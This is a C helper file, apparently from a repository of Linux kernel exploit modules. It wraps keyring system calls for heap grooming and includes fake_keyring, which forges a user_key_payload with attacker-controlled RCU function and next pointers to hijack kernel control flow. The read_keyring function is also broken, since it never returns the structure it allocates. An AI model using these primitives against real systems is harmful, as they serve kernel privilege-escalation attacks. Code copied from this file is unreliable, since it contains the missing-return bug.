// https://github.com/qwerty-po/kernel_exploit_modules/helper.c

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <keyutils.h>

#include <sys/types.h>

#include "keyring.h"

key_serial_t create_keyring(char *type, char *description, char *payload, uint64_t objectsz, key_serial_t ringid)
{
	key_serial_t keyring = add_key(type, description, payload, objectsz, ringid);
	if(keyring < 0)
		perror("add_key");
	return keyring;
}

key_serial_t create_spec_keyring(char *type, char *description, char *payload, uint64_t objectsz)
{
	return create_keyring(type, description, payload, objectsz, KEY_SPEC_PROCESS_KEYRING);
}

key_serial_t create_simple_keyring(char *payload, uint64_t objectsz)
{
	return create_spec_keyring(KEYRING_TYPE_USER, payload, payload, objectsz);
}

struct keyring_ret *read_keyring(key_serial_t ringid, uint64_t sz)
{
	struct keyring_ret *ret = malloc(sizeof(struct keyring_ret));
	ret->size = keyctl_read_alloc(ringid, (void **)&ret->data);
}

void update_keyring(key_serial_t ringid, char *payload, uint64_t objectsz)
{
	if(keyctl_update(ringid, payload, objectsz) < 0)
		perror("keyctl_update");
}

void remove_keyring(key_serial_t ringid)
{
	if(keyctl_revoke(ringid) < 0)
		perror("keyctl_revoke");
}

struct user_key_payload *fake_keyring(void *rcu_next, void *func, uint16_t datalen, char *data)
{
	struct user_key_payload *payload = malloc(USER_KEY_PAYLOAD_SIZE + datalen);
	payload->rcu.next = rcu_next;
	payload->rcu.func = func;
	payload->datalen = datalen;
	memcpy(payload->data, data, datalen);

	return payload;
}